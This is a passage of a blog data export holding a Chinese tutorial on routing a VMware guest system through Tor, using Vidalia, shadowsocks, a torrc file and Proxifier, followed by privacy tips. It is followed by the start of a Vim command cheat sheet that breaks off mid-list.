Tor will ignore it\n\nControlPort 9051\nDataDirectory /Users/ivan/.tor\nDirReqStatistics 0\nHashedControlPassword 16:此处隐藏\nSocks5Proxy 127.0.0.1:1080\nLog notice stdout\nSocksListenAddress 0.0.0.0:9050\nSocksPort 9050\n```\n\n\n</pre>\n![](/content/images/2016/07/1-4.png)\n**4.Vidalia启动TOR**\n\n稍等片刻，需要建立Tor回路，五分钟后，便会提示你连接成功。\n![](/content/images/2016/07/1-5.png)\n随后可以通过使用Chrome的网络代理插件测试，通过ip测试可判断是否成功。如果ip地址每几分钟自动更新一次，且都是不同国家的，则说明TOR回路建立成功。\n![](/content/images/2016/07/2-2.png)\n![](/content/images/2016/07/2-1.png)\n\n### Vmware部分\n\n**1.设置Vmware，添加虚拟网卡**\n\n进入Vmware的偏好设置-网络，先点小锁，把功能解锁。\n\n然后点+，新建一个网络，**警告：请勿勾选NAT**。\n\n**勾选 将MAC主机连入该网络**\n\n同时设置 **通过DHCP在该网络提供网络地址**：\n\n<pre>\n子网ip：172.16.225.0\n\n子网掩码：255.255.255.0\n</pre>\n\n![](/content/images/2016/07/1.jpg)\n**2.在虚拟机系统的配置中，将网络适配器的上网方式改为vmnet2**\n\n虚拟机-设置-网络适配器-vmnet2，请再次确保无其他上网方式以保证绝对安全。\n![](/content/images/2016/07/2.jpg)\n\n### **虚拟机部分(Win)**\n**1.进入操作系统**\n\n建议重新安装操作系统，以保证系统纯净性。\n![](/content/images/2016/07/4-1.jpg)\n![](/content/images/2016/07/5-pic_hd.jpg)\n\n**2.寻找宿主机ip**\n\n经过笔者的简单测试，宿主机ip为172.16.225.1\n![](/content/images/2016/07/6-pic_hd.jpg)\n如果实在找不到，可用啊D工具箱或nmap等工具进行查找。\n\n**3.确认系统当前状态下不能上网，甚至局域网也不可通，检查网络连接中的网络适配器，禁用一切，仅保留本地连接**\n\n**4.安装Proxifier**\n\nProxifier是一个全局代理软件，将socket端口流量转发到系统全局，十分好用稳定，值得推荐。\n\n**5.配置Proxifer**\n\n打开Proxifier-Profile-Proxy Servers，点击Add...\n![](/content/images/2016/07/7-pic_hd.jpg)\n\n随后保存并设置而为默认\n\n**6.测试网络**\n\n打开浏览器，对当前ip进行查询，ip会随着时间随机切换，不同国家。\n![](/content/images/2016/07/9-pic_hd.jpg)\n![](/content/images/2016/07/8-pic_hd.jpg)\n\n### **总结**\n\n为了保证用户隐私的绝对安全，建议做到以下几点：\n\n* 在虚拟机系统下不要留下任何痕迹：\n * 虚拟机操作系统系统语言设置为英语，地区为美国。\n * 虚拟机下的浏览器建议使用friefox或chrome，安装https everywhere、noscript等插件，在浏览器相关设置中设置禁止追踪等查看隐私行为。\n * 关机前清除系统隐私记录，养成良好习惯。\n * 能设置不保留记录的软件均设置如此。\n * 不要安装使用任何国产软件，尤其是任何国产音乐播放器、任何国产视频播放器，严禁使用360等任何管家、QQ、搜狗输入法、各种国产云盘，否则一定会前功尽弃。\n * 不要使用任何私人账户登录任何网站、任何软件，如有必要，建议现场注册新号码，不要自作聪明使用尘封已久的小号。\n* 将虚拟机操作系统放在Truecrypt等加密软件的虚拟磁盘里，如果是Windows，建议开启Bitlocker，如果是MacOS，建议开启FileVault，同时将系统密码设置为与自己隐私无关的高强度密码。\n* 设置宿主机的BIOS密码，防止设备被盗隐私丢失，同时建议写好一键远程删除虚拟磁盘的sh脚本，以防重要文件泄露。\n* 进入TOR网络后，您将面临更大的网络威胁，因为TOR的网域中深藏全球各地的极客、大黑客、恐怖分子等危险人物，请更加注意保护虚拟机子系统安全以及文件安全。\n\n**特别鸣谢**\n\n感谢几年前@safe121提供的无私技术帮助\n\n","source":"_posts/Tor安全上网指南.md","raw":"---\ntitle: Tor安全上网指南\ntags: 'Hack'\npermalink: tor\nid: 4\nupdated: '2016-08-05 21:13:45'\ndate: 2016-07-28 16:01:47\n---\n\n\n本文主要介绍了如何将一个虚拟机系统全局使用TOR技术，笔者所用操作系统为OS X EI Capitan 10.11.5，虚拟机系统为VMware Fusion专业版 8.1.1 (3771013)。\n<!-- more --> \n声明！\n\n==本文原创，技术无罪，笔者即将身处海外，本文撰写目的**仅为防止美国棱镜计划侵犯本人隐私安全，无其它任何用途**。==\n\n==使用TOR技术请在遵守当地法律的前提下使用！本软件在中国大陆地区已被封锁，按照相关法律法规，禁止使用本软件。由于相关政策法律原因，**不允许任何形式私自转载**，本文只进行对TOR相关**技术探讨**，不涉及任何违法违规行为，请勿用于非法用途（如渗透服务器、非法扫描网段、不受监控的网络言论、不受监控的非法互联网通讯等），如出现上述等违法行为，请自负法律责任！==\n\n\n**准备条件**\n\n* 1.一个隧道(ssh,shadowsocks,socket5,http,vpn都可以)可以连接到真正的互联网，如果身处海外请无视此条。\n\n* 2.最新版Vidalia [下载地址](https://dist.torproject.org/vidalia-bundles/)（需完整互联网）\n\n* 3.Vmware Fusion/Vmware workstation/Oracle VirtualBox\n\n* 4.一个完整版的虚拟机操作系统\n\n**笔者环境**\n\n操作系统：OS X EI Capitan 10.11.5\n\n虚拟机软件：VMware Fusion专业版 8.1.1 (3771013)\n\n虚拟机操作系统：Windows xp sp2 或 Kali linux\n\n隧道软件：lantern 或 shadowsockets\n\n### Vidalia部分\n\n*如果你的网络未进行封锁，请忽略前2步，请跑步进入第3步。*\n<img src=\"/content/images/2016/07/1-1.png\" width = \"500px\"/>\n**1.建立您的隧道网络**\n\n笔者以shadowsocks为例，开启shadowsocks配置好信息后，无需做任何操作。shadowsocks的默认对外端口为1080。\n\n**2.在Vidalia中设置代理连接**\n\n打开Vidalia-设置-网络：我使用代理服务器连接网络\n\n地址：127.0.0.1 端口：1080（用户定义）\n\n类型：SOCKS 5\n![](/content/images/2016/07/1-2.png)\n\n**3.继续设置，转发出外网端口**\n\nVidalia-设置-高级-编辑当前torrc：\n![](/content/images/2016/07/1-3.png)\n确认socksport为9050，也可以定义为其他端口。\n同时添加`SocksListenAddress 0.0.0.0:9050`到底部\n保存\n\n笔者配置文件如下，仅供参考，不可复制：\n\n```Bash\n# This file was generated by Tor; if you edit it, comments will not be preserved\n# The old torrc file was renamed to torrc.orig.1 or similar, and Tor will ignore it\n\nControlPort 9051\nDataDirectory /Users/ivan/.tor\nDirReqStatistics 0\nHashedControlPassword 16:此处隐藏\nSocks5Proxy 127.0.0.1:1080\nLog notice stdout\nSocksListenAddress 0.0.0.0:9050\nSocksPort 9050\n```\n\n\n</pre>\n![](/content/images/2016/07/1-4.png)\n**4.Vidalia启动TOR**\n\n稍等片刻，需要建立Tor回路，五分钟后，便会提示你连接成功。\n![](/content/images/2016/07/1-5.png)\n随后可以通过使用Chrome的网络代理插件测试，通过ip测试可判断是否成功。如果ip地址每几分钟自动更新一次，且都是不同国家的，则说明TOR回路建立成功。\n![](/content/images/2016/07/2-2.png)\n![](/content/images/2016/07/2-1.png)\n\n### Vmware部分\n\n**1.设置Vmware，添加虚拟网卡**\n\n进入Vmware的偏好设置-网络，先点小锁，把功能解锁。\n\n然后点+，新建一个网络，**警告：请勿勾选NAT**。\n\n**勾选 将MAC主机连入该网络**\n\n同时设置 **通过DHCP在该网络提供网络地址**：\n\n<pre>\n子网ip：172.16.225.0\n\n子网掩码：255.255.255.0\n</pre>\n\n![](/content/images/2016/07/1.jpg)\n**2.在虚拟机系统的配置中，将网络适配器的上网方式改为vmnet2**\n\n虚拟机-设置-网络适配器-vmnet2，请再次确保无其他上网方式以保证绝对安全。\n![](/content/images/2016/07/2.jpg)\n\n### **虚拟机部分(Win)**\n**1.进入操作系统**\n\n建议重新安装操作系统，以保证系统纯净性。\n![](/content/images/2016/07/4-1.jpg)\n![](/content/images/2016/07/5-pic_hd.jpg)\n\n**2.寻找宿主机ip**\n\n经过笔者的简单测试，宿主机ip为172.16.225.1\n![](/content/images/2016/07/6-pic_hd.jpg)\n如果实在找不到，可用啊D工具箱或nmap等工具进行查找。\n\n**3.确认系统当前状态下不能上网，甚至局域网也不可通，检查网络连接中的网络适配器，禁用一切，仅保留本地连接**\n\n**4.安装Proxifier**\n\nProxifier是一个全局代理软件，将socket端口流量转发到系统全局，十分好用稳定，值得推荐。\n\n**5.配置Proxifer**\n\n打开Proxifier-Profile-Proxy Servers，点击Add...\n![](/content/images/2016/07/7-pic_hd.jpg)\n\n随后保存并设置而为默认\n\n**6.测试网络**\n\n打开浏览器，对当前ip进行查询，ip会随着时间随机切换，不同国家。\n![](/content/images/2016/07/9-pic_hd.jpg)\n![](/content/images/2016/07/8-pic_hd.jpg)\n\n### **总结**\n\n为了保证用户隐私的绝对安全，建议做到以下几点：\n\n* 在虚拟机系统下不要留下任何痕迹：\n * 虚拟机操作系统系统语言设置为英语，地区为美国。\n * 虚拟机下的浏览器建议使用friefox或chrome，安装https everywhere、noscript等插件，在浏览器相关设置中设置禁止追踪等查看隐私行为。\n * 关机前清除系统隐私记录，养成良好习惯。\n * 能设置不保留记录的软件均设置如此。\n * 不要安装使用任何国产软件，尤其是任何国产音乐播放器、任何国产视频播放器，严禁使用360等任何管家、QQ、搜狗输入法、各种国产云盘，否则一定会前功尽弃。\n * 不要使用任何私人账户登录任何网站、任何软件，如有必要，建议现场注册新号码，不要自作聪明使用尘封已久的小号。\n* 将虚拟机操作系统放在Truecrypt等加密软件的虚拟磁盘里，如果是Windows，建议开启Bitlocker，如果是MacOS，建议开启FileVault，同时将系统密码设置为与自己隐私无关的高强度密码。\n* 设置宿主机的BIOS密码，防止设备被盗隐私丢失，同时建议写好一键远程删除虚拟磁盘的sh脚本，以防重要文件泄露。\n* 进入TOR网络后，您将面临更大的网络威胁，因为TOR的网域中深藏全球各地的极客、大黑客、恐怖分子等危险人物，请更加注意保护虚拟机子系统安全以及文件安全。\n\n**特别鸣谢**\n\n感谢几年前@safe121提供的无私技术帮助\n\n","slug":"tor","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"civym300o000hcdonqll99txq","content":"<p>本文主要介绍了如何将一个虚拟机系统全局使用TOR技术，笔者所用操作系统为OS X EI Capitan 10.11.5，虚拟机系统为VMware Fusion专业版 8.1.1 (3771013)。<br><a id=\"more\"></a><br>声明！</p>\n<p>==本文原创，技术无罪，笔者即将身处海外，本文撰写目的<strong>仅为防止美国棱镜计划侵犯本人隐私安全，无其它任何用途</strong>。==</p>\n<p>==使用TOR技术请在遵守当地法律的前提下使用！本软件在中国大陆地区已被封锁，按照相关法律法规，禁止使用本软件。由于相关政策法律原因，<strong>不允许任何形式私自转载</strong>，本文只进行对TOR相关<strong>技术探讨</strong>，不涉及任何违法违规行为，请勿用于非法用途（如渗透服务器、非法扫描网段、不受监控的网络言论、不受监控的非法互联网通讯等），如出现上述等违法行为，请自负法律责任！==</p>\n<p><strong>准备条件</strong></p>\n<ul>\n<li><p>1.一个隧道(ssh,shadowsocks,socket5,http,vpn都可以)可以连接到真正的互联网，如果身处海外请无视此条。</p>\n</li>\n<li><p>2.最新版Vidalia <a href=\"https://dist.torproject.org/vidalia-bundles/\" target=\"_blank\" rel=\"external\">下载地址</a>（需完整互联网）</p>\n</li>\n<li><p>3.Vmware Fusion/Vmware workstation/Oracle VirtualBox</p>\n</li>\n<li><p>4.一个完整版的虚拟机操作系统</p>\n</li>\n</ul>\n<p><strong>笔者环境</strong></p>\n<p>操作系统：OS X EI Capitan 10.11.5</p>\n<p>虚拟机软件：VMware Fusion专业版 8.1.1 (3771013)</p>\n<p>虚拟机操作系统：Windows xp sp2 或 Kali linux</p>\n<p>隧道软件：lantern 或 shadowsockets</p>\n<h3 id=\"Vidalia部分\"><a href=\"#Vidalia部分\" class=\"headerlink\" title=\"Vidalia部分\"></a>Vidalia部分</h3><p><em>如果你的网络未进行封锁，请忽略前2步，请跑步进入第3步。</em><br><img src=\"/content/images/2016/07/1-1.png\" width=\"500px\"><br><strong>1.建立您的隧道网络</strong></p>\n<p>笔者以shadowsocks为例，开启shadowsocks配置好信息后，无需做任何操作。shadowsocks的默认对外端口为1080。</p>\n<p><strong>2.在Vidalia中设置代理连接</strong></p>\n<p>打开Vidalia-设置-网络：我使用代理服务器连接网络</p>\n<p>地址：127.0.0.1 端口：1080（用户定义）</p>\n<p>类型：SOCKS 5<br><img src=\"/content/images/2016/07/1-2.png\" alt=\"\"></p>\n<p><strong>3.继续设置，转发出外网端口</strong></p>\n<p>Vidalia-设置-高级-编辑当前torrc：<br><img src=\"/content/images/2016/07/1-3.png\" alt=\"\"><br>确认socksport为9050，也可以定义为其他端口。<br>同时添加<code>SocksListenAddress 0.0.0.0:9050</code>到底部<br>保存</p>\n<p>笔者配置文件如下，仅供参考，不可复制：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># This file was generated by Tor; if you edit it, comments will not be preserved</span></div><div class=\"line\"><span class=\"comment\"># The old torrc file was renamed to torrc.orig.1 or similar, and Tor will ignore it</span></div><div class=\"line\"></div><div class=\"line\">ControlPort 9051</div><div class=\"line\">DataDirectory /Users/ivan/.tor</div><div class=\"line\">DirReqStatistics 0</div><div class=\"line\">HashedControlPassword 16:此处隐藏</div><div class=\"line\">Socks5Proxy 127.0.0.1:1080</div><div class=\"line\">Log notice stdout</div><div class=\"line\">SocksListenAddress 0.0.0.0:9050</div><div class=\"line\">SocksPort 9050</div></pre></td></tr></table></figure>\n<p><br><img src=\"/content/images/2016/07/1-4.png\" alt=\"\"><br><strong>4.Vidalia启动TOR</strong></p>\n<p>稍等片刻，需要建立Tor回路，五分钟后，便会提示你连接成功。<br><img src=\"/content/images/2016/07/1-5.png\" alt=\"\"><br>随后可以通过使用Chrome的网络代理插件测试，通过ip测试可判断是否成功。如果ip地址每几分钟自动更新一次，且都是不同国家的，则说明TOR回路建立成功。<br><img src=\"/content/images/2016/07/2-2.png\" alt=\"\"><br><img src=\"/content/images/2016/07/2-1.png\" alt=\"\"></p>\n<h3 id=\"Vmware部分\"><a href=\"#Vmware部分\" class=\"headerlink\" title=\"Vmware部分\"></a>Vmware部分</h3><p><strong>1.设置Vmware，添加虚拟网卡</strong></p>\n<p>进入Vmware的偏好设置-网络，先点小锁，把功能解锁。</p>\n<p>然后点+，新建一个网络，<strong>警告：请勿勾选NAT</strong>。</p>\n<p><strong>勾选 将MAC主机连入该网络</strong></p>\n<p>同时设置 <strong>通过DHCP在该网络提供网络地址</strong>：</p>\n<pre>\n子网ip：172.16.225.0\n\n子网掩码：255.255.255.0\n</pre>\n\n<p><img src=\"/content/images/2016/07/1.jpg\" alt=\"\"><br><strong>2.在虚拟机系统的配置中，将网络适配器的上网方式改为vmnet2</strong></p>\n<p>虚拟机-设置-网络适配器-vmnet2，请再次确保无其他上网方式以保证绝对安全。<br><img src=\"/content/images/2016/07/2.jpg\" alt=\"\"></p>\n<h3 id=\"虚拟机部分-Win\"><a href=\"#虚拟机部分-Win\" class=\"headerlink\" title=\"虚拟机部分(Win)\"></a><strong>虚拟机部分(Win)</strong></h3><p><strong>1.进入操作系统</strong></p>\n<p>建议重新安装操作系统，以保证系统纯净性。<br><img src=\"/content/images/2016/07/4-1.jpg\" alt=\"\"><br><img src=\"/content/images/2016/07/5-pic_hd.jpg\" alt=\"\"></p>\n<p><strong>2.寻找宿主机ip</strong></p>\n<p>经过笔者的简单测试，宿主机ip为172.16.225.1<br><img src=\"/content/images/2016/07/6-pic_hd.jpg\" alt=\"\"><br>如果实在找不到，可用啊D工具箱或nmap等工具进行查找。</p>\n<p><strong>3.确认系统当前状态下不能上网，甚至局域网也不可通，检查网络连接中的网络适配器，禁用一切，仅保留本地连接</strong></p>\n<p><strong>4.安装Proxifier</strong></p>\n<p>Proxifier是一个全局代理软件，将socket端口流量转发到系统全局，十分好用稳定，值得推荐。</p>\n<p><strong>5.配置Proxifer</strong></p>\n<p>打开Proxifier-Profile-Proxy Servers，点击Add…<br><img src=\"/content/images/2016/07/7-pic_hd.jpg\" alt=\"\"></p>\n<p>随后保存并设置而为默认</p>\n<p><strong>6.测试网络</strong></p>\n<p>打开浏览器，对当前ip进行查询，ip会随着时间随机切换，不同国家。<br><img src=\"/content/images/2016/07/9-pic_hd.jpg\" alt=\"\"><br><img src=\"/content/images/2016/07/8-pic_hd.jpg\" alt=\"\"></p>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a><strong>总结</strong></h3><p>为了保证用户隐私的绝对安全，建议做到以下几点：</p>\n<ul>\n<li>在虚拟机系统下不要留下任何痕迹：<ul>\n<li>虚拟机操作系统系统语言设置为英语，地区为美国。</li>\n<li>虚拟机下的浏览器建议使用friefox或chrome，安装https everywhere、noscript等插件，在浏览器相关设置中设置禁止追踪等查看隐私行为。</li>\n<li>关机前清除系统隐私记录，养成良好习惯。</li>\n<li>能设置不保留记录的软件均设置如此。</li>\n<li>不要安装使用任何国产软件，尤其是任何国产音乐播放器、任何国产视频播放器，严禁使用360等任何管家、QQ、搜狗输入法、各种国产云盘，否则一定会前功尽弃。</li>\n<li>不要使用任何私人账户登录任何网站、任何软件，如有必要，建议现场注册新号码，不要自作聪明使用尘封已久的小号。</li>\n</ul>\n</li>\n<li>将虚拟机操作系统放在Truecrypt等加密软件的虚拟磁盘里，如果是Windows，建议开启Bitlocker，如果是MacOS，建议开启FileVault，同时将系统密码设置为与自己隐私无关的高强度密码。</li>\n<li>设置宿主机的BIOS密码，防止设备被盗隐私丢失，同时建议写好一键远程删除虚拟磁盘的sh脚本，以防重要文件泄露。</li>\n<li>进入TOR网络后，您将面临更大的网络威胁，因为TOR的网域中深藏全球各地的极客、大黑客、恐怖分子等危险人物，请更加注意保护虚拟机子系统安全以及文件安全。</li>\n</ul>\n<p><strong>特别鸣谢</strong></p>\n<p>感谢几年前@safe121提供的无私技术帮助</p>\n","excerpt":"<p>本文主要介绍了如何将一个虚拟机系统全局使用TOR技术，笔者所用操作系统为OS X EI Capitan 10.11.5，虚拟机系统为VMware Fusion专业版 8.1.1 (3771013)。<br>","more":"<br>声明！</p>\n<p>==本文原创，技术无罪，笔者即将身处海外，本文撰写目的<strong>仅为防止美国棱镜计划侵犯本人隐私安全，无其它任何用途</strong>。==</p>\n<p>==使用TOR技术请在遵守当地法律的前提下使用！本软件在中国大陆地区已被封锁，按照相关法律法规，禁止使用本软件。由于相关政策法律原因，<strong>不允许任何形式私自转载</strong>，本文只进行对TOR相关<strong>技术探讨</strong>，不涉及任何违法违规行为，请勿用于非法用途（如渗透服务器、非法扫描网段、不受监控的网络言论、不受监控的非法互联网通讯等），如出现上述等违法行为，请自负法律责任！==</p>\n<p><strong>准备条件</strong></p>\n<ul>\n<li><p>1.一个隧道(ssh,shadowsocks,socket5,http,vpn都可以)可以连接到真正的互联网，如果身处海外请无视此条。</p>\n</li>\n<li><p>2.最新版Vidalia <a href=\"https://dist.torproject.org/vidalia-bundles/\">下载地址</a>（需完整互联网）</p>\n</li>\n<li><p>3.Vmware Fusion/Vmware workstation/Oracle VirtualBox</p>\n</li>\n<li><p>4.一个完整版的虚拟机操作系统</p>\n</li>\n</ul>\n<p><strong>笔者环境</strong></p>\n<p>操作系统：OS X EI Capitan 10.11.5</p>\n<p>虚拟机软件：VMware Fusion专业版 8.1.1 (3771013)</p>\n<p>虚拟机操作系统：Windows xp sp2 或 Kali linux</p>\n<p>隧道软件：lantern 或 shadowsockets</p>\n<h3 id=\"Vidalia部分\"><a href=\"#Vidalia部分\" class=\"headerlink\" title=\"Vidalia部分\"></a>Vidalia部分</h3><p><em>如果你的网络未进行封锁，请忽略前2步，请跑步进入第3步。</em><br><img src=\"/content/images/2016/07/1-1.png\" width = \"500px\"/><br><strong>1.建立您的隧道网络</strong></p>\n<p>笔者以shadowsocks为例，开启shadowsocks配置好信息后，无需做任何操作。shadowsocks的默认对外端口为1080。</p>\n<p><strong>2.在Vidalia中设置代理连接</strong></p>\n<p>打开Vidalia-设置-网络：我使用代理服务器连接网络</p>\n<p>地址：127.0.0.1 端口：1080（用户定义）</p>\n<p>类型：SOCKS 5<br><img src=\"/content/images/2016/07/1-2.png\" alt=\"\"></p>\n<p><strong>3.继续设置，转发出外网端口</strong></p>\n<p>Vidalia-设置-高级-编辑当前torrc：<br><img src=\"/content/images/2016/07/1-3.png\" alt=\"\"><br>确认socksport为9050，也可以定义为其他端口。<br>同时添加<code>SocksListenAddress 0.0.0.0:9050</code>到底部<br>保存</p>\n<p>笔者配置文件如下，仅供参考，不可复制：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># This file was generated by Tor; if you edit it, comments will not be preserved</span></div><div class=\"line\"><span class=\"comment\"># The old torrc file was renamed to torrc.orig.1 or similar, and Tor will ignore it</span></div><div class=\"line\"></div><div class=\"line\">ControlPort 9051</div><div class=\"line\">DataDirectory /Users/ivan/.tor</div><div class=\"line\">DirReqStatistics 0</div><div class=\"line\">HashedControlPassword 16:此处隐藏</div><div class=\"line\">Socks5Proxy 127.0.0.1:1080</div><div class=\"line\">Log notice stdout</div><div class=\"line\">SocksListenAddress 0.0.0.0:9050</div><div class=\"line\">SocksPort 9050</div></pre></td></tr></table></figure>\n<p></pre><br><img src=\"/content/images/2016/07/1-4.png\" alt=\"\"><br><strong>4.Vidalia启动TOR</strong></p>\n<p>稍等片刻，需要建立Tor回路，五分钟后，便会提示你连接成功。<br><img src=\"/content/images/2016/07/1-5.png\" alt=\"\"><br>随后可以通过使用Chrome的网络代理插件测试，通过ip测试可判断是否成功。如果ip地址每几分钟自动更新一次，且都是不同国家的，则说明TOR回路建立成功。<br><img src=\"/content/images/2016/07/2-2.png\" alt=\"\"><br><img src=\"/content/images/2016/07/2-1.png\" alt=\"\"></p>\n<h3 id=\"Vmware部分\"><a href=\"#Vmware部分\" class=\"headerlink\" title=\"Vmware部分\"></a>Vmware部分</h3><p><strong>1.设置Vmware，添加虚拟网卡</strong></p>\n<p>进入Vmware的偏好设置-网络，先点小锁，把功能解锁。</p>\n<p>然后点+，新建一个网络，<strong>警告：请勿勾选NAT</strong>。</p>\n<p><strong>勾选 将MAC主机连入该网络</strong></p>\n<p>同时设置 <strong>通过DHCP在该网络提供网络地址</strong>：</p>\n<pre>\n子网ip：172.16.225.0\n\n子网掩码：255.255.255.0\n</pre>\n\n<p><img src=\"/content/images/2016/07/1.jpg\" alt=\"\"><br><strong>2.在虚拟机系统的配置中，将网络适配器的上网方式改为vmnet2</strong></p>\n<p>虚拟机-设置-网络适配器-vmnet2，请再次确保无其他上网方式以保证绝对安全。<br><img src=\"/content/images/2016/07/2.jpg\" alt=\"\"></p>\n<h3 id=\"虚拟机部分-Win\"><a href=\"#虚拟机部分-Win\" class=\"headerlink\" title=\"虚拟机部分(Win)\"></a><strong>虚拟机部分(Win)</strong></h3><p><strong>1.进入操作系统</strong></p>\n<p>建议重新安装操作系统，以保证系统纯净性。<br><img src=\"/content/images/2016/07/4-1.jpg\" alt=\"\"><br><img src=\"/content/images/2016/07/5-pic_hd.jpg\" alt=\"\"></p>\n<p><strong>2.寻找宿主机ip</strong></p>\n<p>经过笔者的简单测试，宿主机ip为172.16.225.1<br><img src=\"/content/images/2016/07/6-pic_hd.jpg\" alt=\"\"><br>如果实在找不到，可用啊D工具箱或nmap等工具进行查找。</p>\n<p><strong>3.确认系统当前状态下不能上网，甚至局域网也不可通，检查网络连接中的网络适配器，禁用一切，仅保留本地连接</strong></p>\n<p><strong>4.安装Proxifier</strong></p>\n<p>Proxifier是一个全局代理软件，将socket端口流量转发到系统全局，十分好用稳定，值得推荐。</p>\n<p><strong>5.配置Proxifer</strong></p>\n<p>打开Proxifier-Profile-Proxy Servers，点击Add…<br><img src=\"/content/images/2016/07/7-pic_hd.jpg\" alt=\"\"></p>\n<p>随后保存并设置而为默认</p>\n<p><strong>6.测试网络</strong></p>\n<p>打开浏览器，对当前ip进行查询，ip会随着时间随机切换，不同国家。<br><img src=\"/content/images/2016/07/9-pic_hd.jpg\" alt=\"\"><br><img src=\"/content/images/2016/07/8-pic_hd.jpg\" alt=\"\"></p>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a><strong>总结</strong></h3><p>为了保证用户隐私的绝对安全，建议做到以下几点：</p>\n<ul>\n<li>在虚拟机系统下不要留下任何痕迹：<ul>\n<li>虚拟机操作系统系统语言设置为英语，地区为美国。</li>\n<li>虚拟机下的浏览器建议使用friefox或chrome，安装https everywhere、noscript等插件，在浏览器相关设置中设置禁止追踪等查看隐私行为。</li>\n<li>关机前清除系统隐私记录，养成良好习惯。</li>\n<li>能设置不保留记录的软件均设置如此。</li>\n<li>不要安装使用任何国产软件，尤其是任何国产音乐播放器、任何国产视频播放器，严禁使用360等任何管家、QQ、搜狗输入法、各种国产云盘，否则一定会前功尽弃。</li>\n<li>不要使用任何私人账户登录任何网站、任何软件，如有必要，建议现场注册新号码，不要自作聪明使用尘封已久的小号。</li>\n</ul>\n</li>\n<li>将虚拟机操作系统放在Truecrypt等加密软件的虚拟磁盘里，如果是Windows，建议开启Bitlocker，如果是MacOS，建议开启FileVault，同时将系统密码设置为与自己隐私无关的高强度密码。</li>\n<li>设置宿主机的BIOS密码，防止设备被盗隐私丢失，同时建议写好一键远程删除虚拟磁盘的sh脚本，以防重要文件泄露。</li>\n<li>进入TOR网络后，您将面临更大的网络威胁，因为TOR的网域中深藏全球各地的极客、大黑客、恐怖分子等危险人物，请更加注意保护虚拟机子系统安全以及文件安全。</li>\n</ul>\n<p><strong>特别鸣谢</strong></p>\n<p>感谢几年前@safe121提供的无私技术帮助</p>"},{"title":"Vim 命令大全","id":"3","updated":"2016-08-05T20:14:15.000Z","date":"2016-07-28T09:16:13.000Z","_content":"<!-- more --> \n## \n**进入vi的命令**\n\nvi filename :打开或新建文件，并将光标置于第一行首\n\nvi +n filename ：打开文件，并将光标置于第n行首\n\nvi + filename ：打开文件，并将光标置于最后一行首\n\nvi +/pattern filename：打开文件，并将光标置于第一个与pattern匹配的串处\n\nvi -r filename ：在上次正用vi编辑时发生系统崩溃，恢复filename\n\nvi filename....filename ：打开多个文件，依次进行编辑\n\n## 移动光标类命令\n\nh ：光标左移一个字符\n\nl ：光标右移一个字符\n\nspace：光标右移一个字符\n\nBackspace：光标左移一个字符\n\nk或Ctrl+p：光标上移一行\n\nj或Ctrl+n ：光标下移一行\n\nEnter ：光标下移一行\n\nw或W ：光标右移一个字至字首\n\nb或B ：光标左移一个字至字首\n\ne或E ：光标右移一个字至字尾\n\n) ：光标移至句尾\n\n( ：光标移至句首\n\n}：光标移至段落开头\n\n{：光标移至段落结尾\n\nnG：光标移至第n行首\n\nn+：光标下移n行\n\nn-：光标上移n行\n\nn$：光标移至第n行尾\n\nH ：光标移至屏幕顶行\n\nM ：光标移至屏幕中间行\n\nL ：光标移至屏幕最后行\n\n0：（注意是数字零）光标移至当前行首\n\n$：光标移至当前行尾\n\n## 屏幕翻滚类命令\n\nCtrl+u：向文件首翻半屏\n\nCtrl+d：向文件尾翻半屏\n\nCtrl+f：向文件尾翻一屏\n\nCtrl＋b；向文件首翻一屏\n\nnz：将第n行滚至屏幕顶部，不指定n时将当前行滚至屏幕顶部。\n\n## 插入文本类命令\n\ni ：在光标前\n\nI ：在当前行首\n\na：光标后\n\nA：在当前行尾\n\no：在当前行之下新开一行\n\nO：在当前行之上新开一行\n\nr：替换当前字符\n\nR：替换当前字符及其后的字符，直至按ESC键\n\ns：从当前光标位置处开始，以输入的文本替代指定数目的字符\n\nS：删除指定数目的行，并以所输入文本代替之\n\nncw或nCW：修改指定数目的字\n\nnCC：修改指定数目的行\n\n## 删除命令\n\nndw或ndW：删除光标处开始及其后的n-1个字\n\ndo：删至行首\n\nd$：删至行尾\n\nndd：删除当前行及其后n-1行\n\nx或X：删除一个字符，x删除光标后的，而X删除光标前的\n\nCtrl+u：删除输入方式下所输入的文本\n\n## 搜索及替换命令\n\n/pattern：从光标开始处向文件尾搜索pattern\n\n?pattern：从光标开始处向文件首搜索pattern\n\nn：在同一方向重复上一次搜索命令\n\nN：在反方向上重复上一次搜索命令\n\n：s/p1/p2/g：将当前行中所有p1均用p2替代\n\n：n1,n2s/p1/p2/g：将第n1至n2行中所有p1均用p2替代\n\n：g/p1/s//p2/g：将文件中所有p1均用p2替换\n\n## 选项设置\n\nall：列出所有选项设置情况\n\nterm：设置终端类型\n\nignorance：在搜索中忽略大小写\n\nlist：显示制表位(Ctrl+I)和行尾标志（$)\n\nnumber：显示行号\n\nreport：显示由面向行的命令修改过的数目\n\nterse：显示简短的警告信息\n\nwarn：在转到别的文件时若没保存当前文件则显示NO write信息\n\nnomagic：允许在搜索模式中，使用前面不带“\\”的特殊字符\n\nnowrapscan：禁止vi在搜索到达文件两端时，又从另一端开始\n\nmesg：允许vi显示其他用户用write写到自己终端上的信息\n\n## 最后行方式命令\n\n：n1,n2 co n3：将n1行到n2行之间的内容拷贝到第n3行下\n\n：n1,n2 m n3：将n1行到n2行之间的内容移至到第n3行下\n\n：n1,n2 d ：将n1行到n2行之间的内容删除\n\n：w ：保存当前文件\n\n：e 